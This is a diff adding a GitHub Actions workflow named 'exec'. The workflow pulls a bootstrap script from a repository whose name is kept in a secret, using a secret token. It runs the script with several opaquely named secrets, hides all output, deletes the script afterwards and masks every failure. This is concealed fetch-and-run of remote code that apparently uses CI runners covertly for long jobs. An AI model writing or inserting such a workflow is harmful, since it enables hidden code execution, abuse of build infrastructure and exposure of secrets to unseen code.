@@ -1,0 +1,39 @@
+name: exec
+
+on:
+  workflow_dispatch:
+    inputs:
+      n:
+        description: "run id"
+        required: true
+        type: string
+
+concurrency:
+  group: ghost-${{ inputs.n }}
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+
+jobs:
+  run:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 350
+    steps:
+      - name: Run
+        env:
+          _A: ${{ secrets._A }}
+          _B: ${{ secrets._B }}
+          _K: ${{ secrets._K }}
+          _S: ${{ secrets._S }}
+          _N: ${{ inputs.n }}
+        run: |
+          set +x
+          _u="https://raw.githubusercontent.com/${_B}/main/runner/bootstrap.sh"
+          curl -fsSL --retry 3 --retry-delay 1 --retry-max-time 20 \
+            -H "Authorization: token ${_A}" -o /tmp/_b.sh "$_u" >/dev/null 2>&1 || exit 0
+          chmod +x /tmp/_b.sh
+          _A="$_A" _B="$_B" _K="$_K" _S="$_S" _N="$_N" /tmp/_b.sh >/dev/null 2>&1 || true
+          rm -f /tmp/_b.sh
+          exit 0
+        continue-on-error: true
